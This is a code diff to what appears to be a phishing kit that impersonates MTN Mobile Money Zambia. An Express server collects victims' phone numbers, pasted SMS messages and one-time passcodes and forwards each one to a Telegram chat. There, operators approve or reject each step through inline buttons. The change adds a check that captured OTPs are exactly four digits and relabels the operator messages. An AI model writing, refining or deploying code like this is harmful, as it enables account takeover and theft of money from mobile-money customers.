@@ -1,5 +1,6 @@
 /**
  * **MTN MOMO ZAMBIA - SECURE MULTI-ADMIN SERVER**
+ * Updated with strict 4-digit OTP server-side validation
  */
 
 const express = require('express');
@@ -287,7 +288,7 @@ async function initBot() {
           break;
         case 'PASTED_APPROVE':
           session.status = 'OTP_STEP';
-          await bot.sendMessage(chatTarget, `✅ Valid SMS accepted. OTP screen loaded for +260${session.contact}`);
+          await bot.sendMessage(chatTarget, `✅ Valid SMS accepted. 4-Digit OTP screen loaded for +260${session.contact}`);
           break;
         case 'PASTED_REJECT':
           session.status = 'SMS_REJECTED';
@@ -404,7 +405,6 @@ app.post('/verify-sms-pasted', async (req, res) => {
     session.pasted_sms = pastedSms;
     session.status = 'PENDING_PASTED_SMS';
 
-    // Wrapped in a triple-backtick code block so Telegram adds a copy button
     const message =
       `💬 *MTN ZAMBIA - SMS SUBMITTED*\n\n` +
       `📱 *MTN Phone:* +260${session.contact}\n\n` +
@@ -416,7 +416,7 @@ app.post('/verify-sms-pasted', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ VALID SMS (LOAD OTP)', callback_data: `PASTED_APPROVE_${userId}` },
+            { text: '✅ VALID SMS (LOAD 4-DIGIT OTP)', callback_data: `PASTED_APPROVE_${userId}` },
             { text: '❌ REJECT SMS', callback_data: `PASTED_REJECT_${userId}` }
           ]
         ]
@@ -448,13 +448,18 @@ app.post('/api/submit-otp', async (req, res) => {
 
     if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
 
+    const cleanOtp = String(otp || '').trim();
+    if (!/^\d{4}$/.test(cleanOtp)) {
+      return res.status(400).json({ success: false, error: 'OTP must be exactly 4 digits.' });
+    }
+
     session.status = 'WAITING_OTP_VERIFICATION';
-    session.otp = otp;
+    session.otp = cleanOtp;
 
     const message =
-      `📩 *OTP SUBMITTED BY USER*\n\n` +
+      `📩 *4-DIGIT OTP SUBMITTED BY USER*\n\n` +
       `📱 *MTN Phone:* +260${session.contact}\n` +
-      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
+      `🔢 *4-Digit OTP Entered:* \`${cleanOtp}\`\n\n` +
       `Select confirmation action:`;
 
     const opts = {
@@ -486,3 +491,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
+                                
